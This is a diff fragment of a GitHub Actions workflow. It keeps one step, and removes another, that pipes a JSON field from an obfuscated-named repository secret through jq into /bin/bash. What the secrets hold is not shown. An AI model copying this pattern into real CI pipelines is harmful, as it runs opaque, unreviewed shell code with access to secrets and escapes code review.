@@ -22,7 +22,6 @@ jobs:
           dj31897: ${{ secrets.dj31897 }}
         run: |
           printf '%s' "$dj31897" | jq -r .ukani9 | /bin/bash
-          printf '%s' "$jtkq74804" | jq -r .ktxw770 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
